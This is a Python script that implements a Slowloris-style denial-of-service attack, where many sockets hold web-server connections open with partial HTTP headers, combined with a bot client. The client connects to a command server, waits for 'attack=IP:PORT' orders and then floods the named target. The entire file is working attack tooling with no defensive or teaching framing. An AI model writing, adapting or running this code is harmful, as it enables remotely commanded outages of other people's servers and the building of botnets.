import socket,sys,ipaddress,time

class DOSAttack():
    DEFAULT_TIMEOUT = 4
    def __init__(self,target_ip,target_port = 80,soldiers_count = 200):
        self._target_ip = target_ip
        self._target_port = target_port
        self._soldiers = [self.create_soldier_socket() for _ in range(soldiers_count)]
    
    def create_soldier_socket(self):
        try:
            soldier = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            soldier.settimeout(DOSAttack.DEFAULT_TIMEOUT)
            soldier.connect((self._target_ip,self._target_port))
            soldier.send(self.toRequest("Get /?"))
            print(f"Soldier #{len(self._soldiers) + 1} created.")
            return soldier
        except socket.timeout:
            print(f"Failed to create soldier #{len(self._soldiers) + 1}.")
            return self.create_soldier_socket()
    
    def toRequest(self,s):
        return (f"{s} HTTP/1.1\r\n").encode()
    
    def attack(self,duration=sys.maxsize,sleep=15):
        start_timestamp = time.time()
        i = 0
        while(time.time() - start_timestamp < duration):
            for soldier in self._soldiers:
                try:
                    print(f"Sending request #{i}.")
                    soldier.send(self.toRequest("X-a: "))
                    i += 1
                except socket.error:
                    print(f"Request #{i} failed, recreating soldier...")
                    self._soldiers.remove(soldier)
                    soldier.close()
                    self._soldiers.append(self.create_soldier_socket())
                time.sleep(sleep/len(self._soldiers))
        for soldier in self._soldiers:
            soldier.close()
            self._soldiers.remove(soldier)

def attack(target_ip,target_port):
    dos = DOSAttack(target_ip,target_port,5)
    dos.attack(15)

def main():
    try:
        if len(sys.argv) != 2: raise Exception("Argument missing: [IP:PORT]")
        arg = sys.argv[1].split(":")
        server_ip, server_port = arg[0], int(arg[1])
        ipaddress.ip_address(server_ip)
        if server_port < 1024 or server_port > 65535: raise ValueError
    except Exception as e:
        print(e)
        exit()
    
    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.connect((server_ip,server_port))
    print("Connected to server.")

    while True:
        response = server_socket.recv(1024).decode()
        if len(response) == 0:
            continue
        if response == "end":
            server_socket.close()
            break
        if response == "check_conn":
            message = "connected"
            server_socket.send(message.encode())
            continue
        if response.startswith("attack="):
            try:
                target = response.split("=")[1].split(":")
                target_ip, target_port = target[0], int(target[1])
                ipaddress.ip_address(target_ip)
                if target_port < 0 or target_port > 65535: raise ValueError
            except Exception:
                continue
            server_socket.send(("attacking=true").encode())
            attack(target_ip,target_port)

if __name__ == "__main__":
    main()